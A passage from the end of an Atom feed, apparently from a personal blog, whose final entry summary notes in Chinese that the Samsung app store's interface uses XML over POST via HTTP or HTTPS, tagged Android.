      &lt;p&gt;三星应用商店的接口是&lt;code&gt;XML&lt;/code&gt;格式，使用&lt;code&gt;POST&lt;/code&gt;方式提交，有的使用&lt;code&gt;HTTP&lt;/code&gt;，有的使用&lt;code&gt;HTTPS&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="Android" scheme="http://jack0pan.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="http://jack0pan.github.io/tags/Android/"/>
    
  </entry>
  
</feed>
